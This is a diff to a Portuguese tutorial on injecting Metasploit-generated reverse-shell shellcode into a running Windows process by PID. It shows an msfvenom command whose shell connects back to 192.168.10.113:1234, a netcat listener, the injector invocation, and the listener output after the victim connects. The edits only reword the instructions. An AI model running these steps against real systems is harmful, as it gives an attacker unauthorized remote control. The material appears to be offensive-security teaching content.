@@ -27,7 +27,7 @@ msfvenom -p windows/shell_reverse_tcp
 LHOST=192.168.10.113 LPORT=1234 -f c -b \x00\x0a\x0d
 ```
 
-- Ou Gerar os bytes do shellcode para Windows x64, apontando para o IP do computador que vai ganhar o acesso.
+- Ou Gerar os bytes do shellcode para Windows x64, apontando para o IP e Porta do computador que vai ganhar o acesso.
 
 
 ```ruby
@@ -102,17 +102,17 @@ para vermos o PID podemos usar o "ProcessHacker" ou "procexp"
 nc -vlp 1234
 ```
 
-- Executar o binário que injeta o shellcode passando o PID anotado acima como argumento para o programa injetor :
+- Executar o binário compilado no _Step 2_ para injetar o shellcode passando o PID anotado acima como argumento na hora de executar o 'injectremotePID.exe' :
 
 
 ```cmd
 injectremotePID.exe 2004
 ```
 
-- Feito isso, já devemos ganhar o acesso no alvo.
+- Feito isso, já devemos ganhar o acesso ao computador que executou o shellcode.
 
 
-```bash
+```DOS
 nc -vlp 1234
 listening on [any] 1234 ...
 192.168.10.109: inverse host lookup failed: Host name lookup failure
